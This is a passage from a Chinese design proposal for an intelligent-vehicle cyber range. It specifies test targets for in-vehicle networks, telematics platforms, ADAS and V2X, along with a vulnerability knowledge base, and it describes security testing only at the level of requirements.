信息，并根据车型创建模板，模板还能更新。可进行已开发完成的模型、组件、应用的部署。</p><ol><li>驱动程序开发</li></ol><p>设计开发与通信网络相关的底层驱动程序，实现硬件与软件之间的接口和通信功能，进行驱动程序的调试和测试，确保其正确性和稳定性。驱动程序可满足通信网络靶标对实物还原度85%以上，包括SecOC、IDS等可运行的CAN/CANFD、车载以太网等不完全以来硬件的网络环境。在靶标库中提供的靶标应100%覆盖通信业务安全检测，包含车载CAN总线抗DoS测试、CAN报文抗重放测试、CAN总线模糊测试、诊断访问信息安全测试、诊断数据包防御信息安全测试、诊断模糊测试、诊断复位测试、诊断读写服务测试；诊断动作指令测试、诊断通讯控制服务测试、车载以太网服务认证测试；车载以太网重放攻击测试、车载以太网未授权接入、车载以太网模糊测试、车载以太网端口扫描等。</p><p>基于模板部署通信安全组件和入侵检测组件可支持SecOC和车载IDS。提供信拓扑模板5个，包含的靶标节点20个，并支持10个通信模板靶标的开发。</p><h4 id="车联网安全场景靶标开发方案"><a href="#车联网安全场景靶标开发方案" class="headerlink" title="车联网安全场景靶标开发方案"></a>车联网安全场景靶标开发方案</h4><h5 id="功能实施方案-10"><a href="#功能实施方案-10" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>车联网靶标支持远程升级功能，使得软件和安全补丁能够在不需要物理访问车辆的情况下进行更新，而且还支持数字钥匙靶标、自主代客泊车靶标，远程控车场景的靶标模拟也是系统的一部分，它让测试者能够在安全的测试环境中评估车辆对远程指令的响应能力，这些指令可能包括远程启动发动机、调整车辆设置或是执行特定的驾驶操作。</li><li>确保系统具备灵活的部署能力，既能够在单个服务器上实现单点部署，以满足小规模或者特定的测试场景，又能够支持在多个服务器上进行集群部署，以适应大规模和高可用性的测试需求。</li><li>对移动端APP部署的支持能力，系统能够在桌面或服务器环境中得以部署，同时还能在各种移动设备上通过APP形式顺畅运行。</li><li>在云平台上部署的软件镜像可以轻松地进行更新和升级操作，对于维护系统的安全性、引入新功能以及提高性能至关重要。</li><li>对云平台镜像快速生成的支持，能够迅速构建并部署专为靶标设计的云端镜像，从而大幅缩减开发周期并提高响应速度。</li><li>远程升级应支持以下的相关功能。</li><li>为了更好地控制零件升级的过程和确保车辆的安全性，平台支持零件管理功能，按照ECU类型分类管理，包括建立零件列表、版本管理、升级计划、安全检测、升级日志和用户界面等功能平台支持车辆、车型管理功能，车辆绑定车型，车型关联ECU信息。可以在平台查看每辆车的所有ECU详细软硬件信息。</li><li>平台支持车辆的注册、录入、维护、和增、删、改、查等操作，在车辆注册时，需要输入车辆的基本信息，例如车牌号、VIN码、品牌、型号等，在车辆录入后，可以在平台上查看每辆车的所有ECU详细软硬件信息。平台支持车型的管理，包括车型注册、录入、维护、和增、删、改、查等操作。在车型注册时，需要输入车型的基本信息，例如车型名称、品牌、型号等，同时，还需要关联该车型所对应的ECU信息。平台支持车辆与车型之间的绑定关系，即每辆车都应该对应一个特定的车型，通过车辆与车型的绑定，可以更加精确地管理车辆软件升级过程。平台支持车型与ECU信息的关联，即每种车型都应该对应一组特定的ECU信息。在车型注册时，需要关联该车型所对应的ECU信息，包括ECU类型、型号、版本号等基本信息，通过车型与ECU信息的关联，可以更加精确地管理车辆软件升级过程。平台应提供查询车辆详细软硬件信息的功能，包括车辆基本信息、车型信息和ECU信息等，通过查询车辆软硬件信息，可以更好地进行车辆软件升级和管理。</li><li>平台支持ECU软件版本管理功能。每个软件包只能唯一关联到一个ECU，并确保每个ECU的软件版本号唯一。平台应支持ECU软件包的注册、上传、维护和删除操作，同时提供对软件版本号的唯一性管理。通过建立软件包和ECU之间的关联关系，平台可以实现精确的软件升级。</li><li>平台支持升级包管理功能。用户可以上传ECU各部分软件，包括MCU升级包、MPU升级包以及配置文件等，并通过平台对这些软件进行打包、签名和加密等操作，最终生成ECU的升级文件。这样的功能扩展使得平台能够更好地管理和处理用户上传的软件，确保其安全性和准确性，并为ECU的升级过程提供可靠的支持。</li><li>平台支持差分功能，差分功能可以通过对软件版本进行差分处理，减少生成的最终升级文件大小。通过这样的处理方式，可以为零部件节约存储空间和网络带宽，提高升级效率和速度，并降低用户使用成本。</li><li>平台具备升级策略管理功能，允许管理员设定升级策略并控制固件或软件升级过程中的应用范围。这种策略可以是针对个别车辆的定向升级，也可以是对一小群车辆进行的批量更新，或者是面向所有车辆的广泛升级。通过这样的灵活性，平台能够实施灰度发布，即逐步和有选择性地推出更新，以确保升级过程的平稳和安全，同时有效地管理风险。</li><li>平台支持升级任务管理的功能，该功能包括升级任务的创建、审核、取消以及执行状态的监控等多项功能。用户可以通过平台创建新的升级任务，并在需要时对任务进行审核或取消操作。同时，平台还提供了升级任务执行状态的监控功能，用户可以实时查看任务的执行进度和结果。这样的功能扩展使得平台能够更好地管理和控制升级任务的整个生命周期，提高任务的可控性和效率，确保升级过程的稳定性和准确性。</li><li>平台支持日志管理的功能，该功能可以对车辆上传的升级日志信息进行存储、分析和处理。平台可以将所有的升级日志信息进行记录和存储，并提供相应的查询和检索功能，以便用户随时查看和分析。同时，平台还可以对这些日志信息进行统计和分析，进一步优化升级过程，提高升级效率和质量。</li><li>平台支持大数据分析的功能，该功能可以对后台收集和产生的信息进行分析和呈现。其中包括对车辆总数进行统计，实时监测车辆的活跃状态，以及分析车辆的ECU软件版本情况。此外，平台还能进行升级任务执行成功率的统计和分析。通过大数据分析功能，平台可以对海量的数据进行处理和挖掘，提取有价值的信息并进行可视化呈现。这样的分析结果可以帮助用户了解整个车辆群体的概况，洞察车辆的运行状态和软件版本分布情况，从而更好地制定升级策略和优化升级流程。同时，通过分析升级任务执行成功率，平台可以检测和诊断可能存在的问题，及时采取措施进行改进和修复。</li><li>平台提供了一个全面的用户、角色和权限管理系统，该系统支持从多个维度对访问和操作权限进行细粒度的管理。管理员能够单独为每个用户配置权限，还可以进行批量设置，以便高效地为一组用户分配相同的权限级别，从而大幅度提升权限分配的效率和灵活性。</li><li>数字钥匙模块支持以下功能。</li><li>平台支持钥匙生命周期管理，并提供了全面的支持。从钥匙的初始创建、分发、使用，到最终的废止和更新，每一个环节都得到了精细的管理和监控。</li><li>平台综合性地集成了零件管理功能，该功能致实现全面的零件从入库、出库、使用等全流程管理。这包括对所记录的零件的全流程分类、存储、检索和使用。</li><li>车辆和车型管理功能是核心组成部分之一，它允许用户进行详尽的车辆数据维护，以及对不同车型的精确管理。这种功能不仅涵盖了车辆的基本信息登记，如车辆识别号（VIN）、车型、年份和配置等，还包括了对车辆状态的监控和分析。</li><li>用户管理功能。这一功能模块使得平台管理员能够精确地控制和监督各个用户的访问权限，确保每位用户都能根据其角色和责任获得相应的数据访问级别。此外，用户管理还包括账号的创建、权限的分配、活动的监控以及安全的审计跟踪，从而保障了工作流的顺畅和数据的保密。</li></ol><p><strong>准备工作</strong></p><p>选择硬件：根据需求选择合适的车联网安全场景靶标硬件。</p><p>获取开发板：购买或制作一个带有所选车联网安全场景靶标的开发板。</p><p>开发环境：安装车联网安全场景靶标对应的开发环境和编译器。</p><p>硬件工具：准备编程器/调试器、电源、连接线等硬件工具。</p><p>相关文档：下载车联网安全场景靶标的数据手册和参考资料。</p><p><strong>设计靶标程序</strong></p><p>需求分析：明确靶标程序需要验证的车联网安全场景靶标功能。</p><p>编写代码：使用C语言或汇编语言编写靶标程序。</p><p>初始化车联网安全场景靶标的硬件接口。</p><p>编写功能测试代码，如GPIO闪烁LED、串口通信等。</p><p>如果需要，编写中断服务程序和定时器任务。</p><p><strong>编译和调试</strong></p><p>编译代码：在开发环境中编译靶标程序，生成二进制文件。</p><p>下载程序：使用编程器/调试器将编译好的程序烧录到车联网安全场景靶标中。</p><p>调试程序：通过调试器进行单步执行，监视寄存器和变量的值，确保程序按预期工作。</p><p><strong>验证和测试</strong></p><p>功能测试：逐一测试车联网安全场景靶标的各项功能是否正常。</p><p>性能测试：如果需要，进行性能测试，比如执行速度、功耗测试。</p><p>稳定性测试：长时间运行靶标程序，检查车联网安全场景靶标的稳定性。</p><p><strong>文档和报告</strong></p><p>编写文档：记录靶标制作的过程和测试结果。</p><p>问题记录：如果在测试中发现问题，详细记录并分析原因。</p><p>改进建议：提出对靶标程序的改进意见。</p><p>在进行性能和稳定性测试时，注意散热问题，防止车联网安全场景靶标过热。</p><ol><li>初始提供的靶标不仅包括了基础功能，还特别集成了远程升级、数字钥匙、远程控车以及远程诊断等高级功能。远程升级功能允许系统通过无线网络对MCU固件进行更新，确保靶标能够及时接收到最新的功能改进和安全补丁。数字钥匙功能则提供了一种安全的身份验证机制，使得用户能够通过智能设备对车辆进行访问和控制。远程控车功能让用户能够在远离车辆的情况下执行特定的车辆操作，如锁定或启动车辆。最后，远程诊断功能为用户提供了一种便捷的方式，可以远程检查车辆状态，对潜在的问题进行预诊断，大大提高了维护效率。</li><li>车联网靶标对于业务平台能实现还原达到100%，靶标一个精确复制了实际业务环境的高保真操作系统，包括操作系统的全面复制，所有的系统调用、服务和行为与真实环境中的操作系统一致；应用程序的深度集成，以保证在靶标上运行的应用程序与生产环境中运行的版本无差异；分布式部署的精确模拟，允许靶标在模拟复杂网络和服务架构时，完整地再现出业务平台的分布式特性。</li><li>靶标的CPU、内存和硬盘资源可根据需求进行自定义配置，用户可以灵活地调整这些资源的分配。同时，为了确保系统的稳定性和应用的正常运行，可以对配置进行最低要求的限制，可避免靶标因资源不足而导致系统资源占用率过高，确保靶标具备足够的资源，以满足应用程序的需求，并保持系统的稳定性和性能。靶标上进行各种测试和实验，避免应用无法正常运行的问题。通过此种方式就无需担心资源不足的问题，从而更好地评估和分析系统的安全性和性能。</li></ol><h5 id="技术实现内容-10"><a href="#技术实现内容-10" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>在车联网安全场景靶标开发过程中，遵循产品定制开发的基本原则，基于车联网通信网络的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>首先确定车联网安全场景靶标库的目标网络和应用场景，分析车联网安全场景的需求和威胁情况，确定靶标库支持的车辆通信网络和相关协议，如CAN、Ethernet、LIN等。在设计中可满足远程升级、数字钥匙、自主代客泊车、远程控车场景的云平台靶标要求。</p><ol><li>靶标库设计</li></ol><p>设计车联网安全场景靶标库的数据结构和算法，完全考虑车辆通信网络的安全漏洞和攻击方式，定义相应的靶标场景，确定靶标库需要提供的安全特征和指标，如攻击模式、异常行为等。远程升级、数字钥匙、自主代客泊车、远程控车场景的云平台靶标，靶标库可实现服务端移动端APP部署、单点部署和基群部署，包含了云平台镜像更新升级、支持云平台镜像快速生成、数字钥匙功能、远程升级等功能（平台的管理功能、配置功能、车型管理功能、升级下发功能等）。</p><p>其中数字钥匙功能包括零件管理功能、车辆、车型管理功能、用户管理等基础功能。</p><p>在平台方面，此靶标开发可以完成多维度的用户、角色、权限管理。在存在大多数人员角色管理的同时，能够批量或者单独为用户配置权限，且可以查看用户的操作记录。平台的大数据还具备分析功能，整体后台能收集、产生的信息进行分析、呈现，包括车辆总数、车辆活跃状态、车辆ECU软件版本情况、升级任务执行成功率等。车辆、车型管理功能，车辆绑定车型，车型关联ECU信息。支持ECU软件版本管理功能，每个软件包只能唯一关联到一个ECU，每个ECU的软件版本号应唯一。可以在平台查看每辆车的所有ECU详细软硬件信息。</p><p>升级包管理功能中，平台对用户上传的ECU各部分软件打包（如MCU升级包、MPU升级包、配置文件等）、签名、加密等生成ECU的最终升级文件。</p><p>在任务管理中，升级任务支持创建、审核、取消、执行、状态监控等功能。日志管理功能中，能对车辆上传的升级日志信息进行存储、分析处理。</p><ol><li>靶标开发</li></ol><p>开发车联网安全场景靶标库的软件模块，实现靶标库的数据生成和模拟功能，以模拟各种安全攻击和异常行为，考虑靶标库的可扩展性，以支持新的安全场景和攻击方式的添加。</p><ol><li>靶标验证</li></ol><p>使用靶标库生成的数据进行验证和测试，确保靶标库能够准确地模拟各种安全攻击和异常行为，进行功能测试和性能测试，验证靶标库的功能和性能是否符合要求。</p><h4 id="ADAS靶标开发方案"><a href="#ADAS靶标开发方案" class="headerlink" title="ADAS靶标开发方案"></a>ADAS靶标开发方案</h4><h5 id="功能实施方案-11"><a href="#功能实施方案-11" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>支持自适应巡航控制（ACC）场景的ADAS靶标，确保靶标能够充分模拟与ACC相关的全部功能和工作条件。这包括车辆速度控制、距离监测、环境感知以及与其他车辆的通信协议。</li><li>实现高效的自动紧急制动（AEB）系统测试，ADAS靶标能够全面模拟AEB系统所需的各种情景。靶标能够准确地重现包括但不限于车辆与行人、其他车辆或障碍物之间的交互，以及复杂的紧急制动情境。</li><li>支持前碰撞警告（FCW）系统场景的ADAS靶标，确保靶标能够综合模拟前碰撞警告系统在多种驾驶环境下可能遇到的各种情况。靶标不仅能够模仿静态和动态对象，还能模拟各种车辆行为和交通状况，以便于开发者在一个真实且动态变化的模拟环境中进行测试。</li><li>支持IHBC场景的靶标，ADAS靶标必须能够模拟各种夜间行驶情境，确保靶标能够准确再现其他车辆的灯光以及多样化的道路照明条件。</li><li>支持交通标志识别（TSR）系统场景的ADAS靶标，精确模拟各类交通标志的靶标，以便于系统能够在各种复杂环境下进行准确的识别和响应；</li><li>支持LDW场景的靶标，ADAS靶标需要模拟真实的车道标线和路面特征。这些靶标应该能够在不同的光照和天气条件下，包括雨天、雾天以及夜间环境，提供清晰的车道标志识别。</li><li>支持LKA场景的靶标，能够模仿各种车道线和路边界，以便系统在多样化的道路环境中都能精确识别和作出反应。</li><li>满足智能驾驶网络安全动态仿真系统对实物靶标的接入需求，专注于开发能够与高级驾驶辅助系统（ADAS）无缝对接的靶标，这些靶标能模拟各种交通环境、路况以及潜在的网络安全威胁，还能够动态调整参数以适应系统测试的不同阶段。通过实际的网络和虚拟网络结合，将实物靶标接入到网络中，即可完成动态仿真系统对实物靶标的接入，靶标设计满足实时数据交换的需求，在模拟攻击或防御场景时，能够提供真实反馈，并支持系统通过实时的网络通信进行快速诊断和响应。</li><li>提供一份详尽的靶标制作方法教程，包括所需材料、软件工具、以及步骤指南。靶标制作教程如下：</li></ol><p><strong>准备工作</strong></p><p>选择硬件：根据需求选择合适的ADAS靶标硬件。</p><p>获取开发板：购买或制作一个带有所选ADAS靶标的开发板。</p><p>开发环境：安装ADAS靶标对应的开发环境和编译器。</p><p>硬件工具：准备编程器/调试器、电源、连接线等硬件工具。</p><p>相关文档：下载ADAS靶标的数据手册和参考资料。</p><p><strong>设计靶标程序</strong></p><p>需求分析：明确靶标程序需要验证的ADAS靶标功能。</p><p>编写代码：使用C语言或汇编语言编写靶标程序。</p><p>初始化ADAS靶标的硬件接口。</p><p>编写功能测试代码，如GPIO闪烁LED、串口通信等。</p><p>如果需要，编写中断服务程序和定时器任务。</p><p><strong>编译和调试</strong></p><p>编译代码：在开发环境中编译靶标程序，生成二进制文件。</p><p>下载程序：使用编程器/调试器将编译好的程序烧录到ADAS靶标中。</p><p>调试程序：通过调试器进行单步执行，监视寄存器和变量的值，确保程序按预期工作。</p><p><strong>验证和测试</strong></p><p>功能测试：逐一测试ADAS靶标的各项功能是否正常。</p><p>性能测试：如果需要，进行性能测试，比如执行速度、功耗测试。</p><p>稳定性测试：长时间运行靶标程序，检查ADAS靶标的稳定性。</p><p><strong>文档和报告</strong></p><p>编写文档：记录靶标制作的过程和测试结果。</p><p>问题记录：如果在测试中发现问题，详细记录并分析原因。</p><p>改进建议：提出对靶标程序的改进意见。</p><p>在进行性能和稳定性测试时，注意散热问题，防止ADAS靶标过热。</p><h5 id="技术实现内容-11"><a href="#技术实现内容-11" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>在ADAS靶标开发过程中，遵循产品定制开发的基本原则，基于ADAS通信网络的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>确定ADAS靶标的应用场景，如自动紧急制动、自适应巡航控制等。根据现有市场所分析ADAS系统的功能和性能要求，如传感器数据处理、决策算法等。确定靶标支持的传感器类型和相关协议，如摄像头、雷达、激光雷达等。</p><ol><li>靶标库设计</li></ol><p>设计ADAS安全场景靶标库的数据结构和算法，智能驾驶网络安全动态仿真系统实物靶标接入，开发ADAS靶标库的软件模块。实现靶标库的数据生成和模拟功能，以模拟各种驾驶场景和传感器数据。考虑靶标库的可扩展性，以支持新的驾驶场景和传感器类型的添加。</p><p>主要的ADAS场景包括ACC、AEB、FCW、IHBC、TSR、LDW、LKA，分别如下：</p><p>自适应巡航控制（Adaptive Cruise Control，ACC）：ACC利用雷达或摄像头等传感器监测前方车辆的距离和速度，自动调整车辆的速度以保持安全距离。</p><p>自动紧急制动（Automatic Emergency Braking，AEB）：AEB通过车辆前部的传感器监测前方障碍物，如果检测到碰撞风险，系统会自动触发紧急制动以避免或减轻碰撞。</p><p>车道保持辅助（Lane Keeping Assist，LKA）：LKA使用摄像头或传感器来检测车辆在车道内的位置，如果车辆偏离车道，系统会发出警告或施加轻微的转向力以纠正车辆的行驶轨迹。</p><p>盲点监测（Blind Spot Detection，BSD）：BSD利用传感器监测车辆侧后方的盲点区域，如果有其他车辆进入盲点，系统会发出警告，提醒驾驶员注意。</p><p>车道变换辅助（Lane Change Assist，LCA）：LCA帮助驾驶员进行车道变换，当驾驶员打开转向灯时，系统会监测并发出警告，以提醒驾驶员注意周围的车辆。</p><p>前方碰撞警告（Forward Collision Warning，FCW）：FCW使用传感器监测前方车辆和障碍物，如果检测到碰撞风险，系统会发出警告，提醒驾驶员采取行动。</p><p>目标识别和识别（Object Detection and Recognition）：这项技术使用摄像头、雷达等传感器来识别并跟踪道路上的车辆、行人、自行车等目标，以提供更全面的环境感知。</p><p>智能远光灯控制（Intelligent High Beam Control，IHBC）：IHBC利用车辆上的摄像头或传感器来检测前方来车或其他车辆的尾灯，并根据检测结果自动切换远光灯和近光灯，以提供最佳的照明效果和安全性。</p><p>交通标志识别（Traffic Sign Recognition，TSR）：TSR使用车辆上的摄像头或传感器来识别道路上的交通标志，例如限速标志、禁止标志等，并将这些信息显示在驾驶员的仪表盘或导航屏幕上，帮助驾驶员及时了解道路规则和限制。</p><p>车道偏离警告（Lane Departure Warning，LDW）：LDW通过车辆上的摄像头或传感器来监测车辆在车道内的位置，如果检测到车辆偏离当前车道，系统会发出警告，提醒驾驶员采取措施纠正车辆的行驶轨迹，以减少意外事故的风险。</p><ol><li>靶标验证</li></ol><p>使用靶标库生成的数据进行验证和测试,确保靶标库能够准确地模拟各种驾驶场景和传感器数据,进行功能测试和性能测试，验证靶标库的功能和性能是否符合要求。</p><h4 id="V2X靶标开发方案"><a href="#V2X靶标开发方案" class="headerlink" title="V2X靶标开发方案"></a>V2X靶标开发方案</h4><h5 id="功能实施方案-12"><a href="#功能实施方案-12" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>支持车对车（V2V）、车对路边单元（V2I）以及车对云（V2C）通信场景的V2X靶标时，我们的目标是构建一套能够全面模拟现实世界交互的系统。这些靶标能够精确地再现车辆之间的信息交换，路边基础设施的数据传输，以及与云端服务的互联互通。它们能够在各种环境条件下，如城市拥堵、高速公路、以及多变的天气条件中，测试和验证车辆通信系统的可靠性和效率。</li><li>支持PC5通信拒绝服务攻击的v2x靶标，V2X靶标开发专注于包含对拒绝服务攻击（DoS）的模拟和测试能力。这种靶标将模拟攻击者试图通过大量请求来干扰PC5通信，从而测试车载系统在此类攻击下的韧性和响应能力。</li><li>支持PC5网络通信数据安全的v2x靶标，确保数据传输的绝对安全性，这要求靶标系统能够模拟并验证各种数据保护机制。这样的靶标应具备高级加密测试功能，以确保车辆之间、车辆与基础设施之间的通信在PC5协议下能够抵抗未授权访问和数据篡改。</li><li>支持PC5通信加密传输的V2X靶标。该靶标将专门设计用来验证和测试车辆通信系统在使用PC5协议时的加密传输能力，确保数据在车对车（V2V）以及车与基础设施（V2I）间传输过程中的保密性和完整性。它将模拟各种加密算法和密钥交换协议，以评估车载系统在实际操作中对抗电子窃听和数据篡改的能力。</li><li>对PC5通信协议中双向认证机制的安全性进行全面支持的v2x靶标。靶标能够精确地模拟和评估在车辆之间（V2V）、车辆与基础设施之间（V2I）的通信流程中，双方身份认证的强度和可靠性。靶标提供一套完整的测试方案，用以验证通信参与者在建立连接前能否有效地进行身份确认，以及认证过程是否能够抵御各种安全攻击，包括身份冒充和中间人攻击。</li><li>支持UU通信拒绝服务攻击的测试能力的v2x靶标，以便为车联网安全性提供全方位的保障。该靶标将具备模拟和评估UU通信在面临DoS攻击时的响应和防御机制，确保在真实场景下，车辆与用户设备之间的通信能够有效地抵御那些旨在干扰服务的恶意攻击。</li><li>对UU网络通信数据安全的全面支持的v2x靶标。靶标能够模拟用户之间的网络通信场景，并对数据传输过程的安全性进行严密的测试。它具备评估数据加密强度、验证身份认证协议、检测数据完整性以及防护隐私泄露等能力，确保在用户与用户的交互中，所有传输的信息都得到了恰当的保护。</li><li>对UU通信加密传输的支持的v2x靶标，确保用户间的数据交换能够得到严格的保密性和安全性。这一靶标将专注于评估和加强用户设备间通信过程中的加密机制，以防止数据在传输途中被窃听或篡改。它将模拟各种加密传输场景，对加密算法的强度进行测试，并确保密钥管理的安全性，从而提供一个可靠的基准，用以检验车联网环境下用户设备通信的密钥交换和数据加密过程是否坚不可摧。</li><li>支持UU通信的双向认证安全性的v2x靶标，靶标确保用户之间的通信连接不仅是加密的，而且双方的身份都经过了严格的验证。靶标将模拟和评估在用户与用户通信过程中实施的认证机制，确保每次通信启动时，双方都能确认对方的合法性。这种双向认证过程对于防止未授权的访问和数据泄露至关重要，因此，靶标必须能够检测任何可能的认证漏洞，并提供对抗诸如中间人攻击等安全威胁的能力。</li><li>支持对数字证书签名与验签安全性的v2x靶标，首先生成一个安全的密钥对，包括私钥和公钥。使用私钥对待签名的数据进行签名操作，生成数字签名。将签名和公钥与原始数据一起打包形成数字证书。在验签过程中，使用数字证书中的公钥对签名进行验证，确保签名的完整性和真实性，从而确保数据的安全性和可信度，确保通信双方能够通过可信的数字签名来确认身份和消息的完整性。</li><li>提供一份详尽的靶标制作方法教程，包括所需材料、软件工具、以及步骤指南。靶标制作教程如下：</li></ol><p><strong>准备工作</strong></p><p>选择硬件：根据需求选择合适的V2X靶标硬件。</p><p>获取开发板：购买或制作一个带有所选V2X靶标的开发板。</p><p>开发环境：安装V2X靶标对应的开发环境和编译器。</p><p>硬件工具：准备编程器/调试器、电源、连接线等硬件工具。</p><p>相关文档：下载V2X靶标的数据手册和参考资料。</p><p><strong>设计靶标程序</strong></p><p>需求分析：明确靶标程序需要验证的V2X靶标功能。</p><p>编写代码：使用C语言或汇编语言编写靶标程序。</p><p>初始化V2X靶标的硬件接口。</p><p>编写功能测试代码，如GPIO闪烁LED、串口通信等。</p><p>如果需要，编写中断服务程序和定时器任务。</p><p><strong>编译和调试</strong></p><p>编译代码：在开发环境中编译靶标程序，生成二进制文件。</p><p>下载程序：使用编程器/调试器将编译好的程序烧录到V2X靶标中。</p><p>调试程序：通过调试器进行单步执行，监视寄存器和变量的值，确保程序按预期工作。</p><p><strong>验证和测试</strong></p><p>功能测试：逐一测试V2X靶标的各项功能是否正常。</p><p>性能测试：如果需要，进行性能测试，比如执行速度、功耗测试。</p><p>稳定性测试：长时间运行靶标程序，检查V2X靶标的稳定性。</p><p><strong>文档和报告</strong></p><p>编写文档：记录靶标制作的过程和测试结果。</p><p>问题记录：如果在测试中发现问题，详细记录并分析原因。</p><p>改进建议：提出对靶标程序的改进意见。</p><p>在进行性能和稳定性测试时，注意散热问题，防止V2X靶标过热。</p><ol><li>提供靶标制作培训，涵盖所有与靶标制作相关的关键技术和步骤，确保开发人员能够充分理解和掌握从设计到实施的整个制作过程。</li></ol><h5 id="技术实现内容-12"><a href="#技术实现内容-12" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>在V2X靶标开发过程中，遵循产品定制开发的基本原则，基于V2X通信网络的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>V2X（Vehicle-to-Everything）是指车辆与周围环境中的各种实体（如其他车辆、道路设施、行人等）进行通信和交互的技术。</p><p>首先，V2X靶标开发的具体需求和目标是支持PC5和UU通信中相关的靶标实现，如服务器、终端等。这些包括特定的通信场景、交互功能、安全性要求等。</p><p>靶标库设计</p><p>选择适合的硬件平台来支持V2X通信，这包括车载单元（On-Board Unit，OBU）、路侧单元（Roadside Unit，RSU）等设备，同时支持车与车、车与路边单元、车与云靶标场景。考虑到通信范围、处理能力、安全性和可靠性等因素。</p><p>根据开发的通信协议，实施V2X通信靶标，并进行测试和验证。将涉及到硬件设备的配置、软件的开发和集成、通信性能的测试等。确保靶标的功能和性能符合预期，并满足相关的性能指标和安全要求。</p><p>设计开发出满足车与车、车与路边单元、车与云靶标场景，同时支持PC5和UU通信协议，可进行数字证书签名验签安全性靶标，完成协议的拒绝服务、数据安全、加密传输及双向认证测试。</p><h1 id="智能汽车网络靶场知识库"><a href="#智能汽车网络靶场知识库" class="headerlink" title="智能汽车网络靶场知识库"></a>智能汽车网络靶场知识库</h1><h2 id="技术路线-2"><a href="#技术路线-2" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="智能汽车网络靶场漏洞库"><a href="#智能汽车网络靶场漏洞库" class="headerlink" title="智能汽车网络靶场漏洞库"></a>智能汽车网络靶场漏洞库</h3><p>车联网安全涉及云端业务系统、移动端APP资产和车端各类组件资产。建设面向车联漏洞运营管理体系，应支持全面漏洞信息，进行有效的管理筛选，快速处置关键风险。</p><p>漏洞库全面支持对漏洞内容的管理，支持下述相关功能。</p><h4 id="功能实施方案-13"><a href="#功能实施方案-13" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>漏洞信息内容包含：漏洞编号、漏洞名称、漏洞类型、影响级别、漏洞描述、修复建议、数据来源等信息。漏洞编号是对漏洞进行唯一标识的编号，有助于在漏洞管理系统中进行追踪和记录。漏洞名称则提供了对该漏洞的简要描述，便于快速了解漏洞的大致情况。漏洞类型指明了漏洞所属的类别或类型，例如网络漏洞、应用程序漏洞、操作系统漏洞等。影响级别表示漏洞对系统安全的威胁程度，通常以高、中、低或严重、一般、轻微等级别进行评估。漏洞描述提供了对漏洞的详细描述，包括漏洞的原因、攻击方式、可能导致的后果等。修复建议提供了针对漏洞的修复方法和措施，包括补丁更新、配置调整、安全策略等。数据来源指明了漏洞信息的获取途径，例如来自公开的安全通告、第三方漏洞报告、漏洞扫描工具等；</li><li>支持漏洞定性定级，包括漏洞利用方式是否需要交互、是否需要进行认证、漏洞利用条件、漏洞触发方式、漏洞直接后果、漏洞影响范围。漏洞利用方式是否需要交互是指攻击者是否需要与目标系统进行交互才能成功利用漏洞。是否需要进行认证是指攻击者在利用漏洞之前是否需要通过身份验证。漏洞利用条件描述了利用漏洞所需的特定条件或环境。漏洞触发方式描述了攻击者如何触发漏洞并执行恶意操作。漏洞的直接后果指攻击者成功利用漏洞后可能导致的直接影响。漏洞的影响范围描述了漏洞可能对系统、网络或业务产生的影响。这可以是特定软件、设备、网络或整个系统；</li><li>具备漏洞优先级排序模型，支持漏洞与利用情报、网关防御规则自动关联，进行漏洞优先级排序。漏洞优先级排序模型可以根据漏洞的严重性、公开程度、利用难度、影响范围等多个维度对漏洞进行优先级排序。漏洞与利用情报、网关防御规则自动关联也是一项非常重要的功能。通过将漏洞信息与已知的利用情报和网关防御规则相结合，可以进一步加强漏洞评估和管理的能力。漏洞优先级排序模型还可以支持漏洞自动化修复和漏洞修复计划的制定。通过自动化修复漏洞，可以大大减少人工操作的时间和错误率，从而提高修复效率和减少安全风险；</li><li>漏洞知识库包含汽车网络、传统网络相关的漏洞信息，同时支持第三方漏洞数据对接，如CVE、CNVD等漏洞信息。漏洞知识库存储了各种已知的漏洞，包括利用方法、影响范围以及可能的修复方法等详细信息。这个知识库的目的是为企业和个人提供一个集中的平台，以便他们可以轻松地查找和了解不同类型的漏洞。漏洞知识库不仅包含了与传统网络相关的漏洞，还涵盖了与汽车网络相关的漏洞。漏洞知识库还支持第三方漏洞数据的对接。可以与其他漏洞信息来源进行集成，例如CVE、CNVD等。通过与这些第三方漏洞数据源的对接，漏洞知识库可以及时获取最新的漏洞信息，确保其信息的准确性和完整性；</li><li>漏洞库条目整合CVE、CNNVD、CNVD条目为一条，而非分开存放，漏洞条目10万余条万条；产品功能截图如下图：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d65d021ba2c33469f8d5e131d5f1a486.png"></p><ol><li>漏洞更新频次可自定义周、月等，重大漏洞情报应及时更新。漏洞更新频次是指漏洞知识库中漏洞信息的更新时间间隔。这个频次可以根据实际需求进行自定义，例如每周、每月等。通过定期更新漏洞信息，可以确保漏洞知识库中的信息始终保持最新和准确。在更新漏洞信息时，重大漏洞情报被优先考虑并及时更新。重大漏洞可能会对系统的安全性造成严重威胁，并且攻击者通常会迅速利用这些漏洞进行攻击；</li><li>支持与靶场知识图谱进行关联。靶场漏洞库可以与靶场知识图谱进行关联，以通过与靶场的互联建立漏洞和攻击之间的关系。与靶场知识图谱的关联后，漏洞知识库也能获取到更多的漏洞信息，包括攻击者可能利用的漏洞和攻击方法等，以此来建立更丰富的漏洞库，对于漏洞的修复和网络安全的加固可以起到重要作用；</li><li>汽车漏洞初始数量达到2000条。初始数量达到2000条的漏洞信息可以提供一个相对全面的起点，以便能够更好地了解和管理汽车安全风险；</li><li>根据现有测试数据、众测活动及漏洞提交平台审核通过的漏洞数据总结出专用漏洞。根据现有测试数据、众测活动及漏洞提交平台审核通过的漏洞数据，可以总结出专用漏洞。这些专用漏洞是指在特定车型或特定系统中发现的针对性的安全漏洞，对于该车型或系统的安全性具有重要影响；</li>